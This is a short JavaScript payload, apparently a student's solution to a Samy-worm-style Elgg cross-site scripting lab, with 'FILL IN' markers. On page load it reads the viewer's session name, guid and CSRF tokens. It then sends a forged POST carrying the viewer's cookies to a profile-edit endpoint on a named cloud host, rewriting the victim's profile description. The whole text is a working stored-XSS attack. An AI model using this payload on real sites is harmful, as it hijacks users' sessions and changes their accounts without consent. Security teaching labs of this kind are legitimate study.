<script type="text/javascript">
window.onload = function(){
//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
//and Security Token __elgg_token
var userName=elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;

var descri="&description=Samy+is+my+Hero&accesslevel[description]=2";

//Construct the content of your url.
var content=token+ts+"&name="+userName+descri; //FILL IN
var sendurl="http://ec2-54-90-220-11.compute-1.amazonaws.com/action/profile/edit"; //FILL IN
var samyGuid=47; //FILL IN
if(elgg.session.user.guid!=samyGuid)
{
//Create and send Ajax request to modify profile
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","ec2-54-90-220-11.compute-1.amazonaws.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
//changes here
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Refere","http://ec2-54-90-220-11.compute-1.amazonaws.com/profile/"+userName+"/edit");
Ajax.send(content);
}
}
</script>